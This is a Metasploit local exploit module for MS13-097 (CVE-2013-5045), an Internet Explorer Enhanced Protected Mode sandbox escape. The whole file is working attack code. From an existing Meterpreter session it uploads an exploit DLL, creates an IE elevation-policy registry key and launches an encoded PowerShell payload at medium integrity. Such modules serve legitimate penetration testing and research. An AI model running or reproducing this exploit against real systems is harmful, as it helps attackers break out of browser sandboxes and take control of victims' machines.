##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'           => 'MS13-097 Registry Symlink IE Sandbox Escape',
      'Description'    => %q{
        This module exploits a vulnerability in Internet Explorer Sandbox which allows to
        escape the Enhanced Protected Mode and execute code with Medium Integrity. The
        vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll
        component, which can be abused to force medium integrity IE to user influenced keys.
        By using registry symlinks it's possible force IE to add a policy entry in the registry
        and finally bypass Enhanced Protected Mode.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'James Forshaw', # Vulnerability Discovery and original exploit code
          'juan vazquez' # metasploit module
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Stance'        => Msf::Exploit::Stance::Aggressive,
      'Targets'       =>
        [
          [ 'IE 8 - 11', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => "Dec 10 2013",
      'References'     =>
        [
          ['CVE', '2013-5045'],
          ['MSB', 'MS13-097'],
          ['BID', '64115'],
          ['URL', 'https://github.com/tyranid/IE11SandboxEscapes']
        ],
      'DefaultOpts' => { 'WfsDelay' => 30 }
    ))
  end

  def exploit
    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?

    mod_handle = session.railgun.kernel32.GetModuleHandleA('iexplore.exe')
    if mod_handle['return'] == 0
      fail_with(Failure::NotVulnerable, "Not running inside an Internet Explorer process")
    end

    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, "Not running at Low Integrity")
    end

    print_status("Loading Exploit Library...")
    temp = get_env('TEMP')

    session.core.load_library(
      'LibraryFilePath' => ::File.join(Msf::Config.data_directory, "exploits", "CVE-2013-5045", "CVE-2013-5045.dll"),
      'TargetFilePath'  => temp +  "\\CVE-2013-5045.dll",
      'UploadLibrary'   => true,
      'Extension'       => false,
      'SaveToDisk'      => false
    )

    print_status("Waiting 15s for user to approve...")
    sleep(15)

    keys = registry_enumkeys("HKCU\\Software\\Microsoft\\Internet Explorer\\Low Rights\\ElevationPolicy")

    if keys.include?('{C2B9F6A6-6E3C-4954-8A73-69038A049D00}')
      print_good("Successfully created the elevation key")
      print_status("Attempting to launch powershell payload...")
      cmd = cmd_psh_payload(payload.encoded).gsub('%COMSPEC% /B /C start powershell.exe ','').strip
      session.railgun.shell32.ShellExecuteA(nil,"open","powershell.exe",cmd,nil,0)
    else
      fail_with(Exploit::Failure::Unknown,"Registry elevation key not created")
    end
  end

end

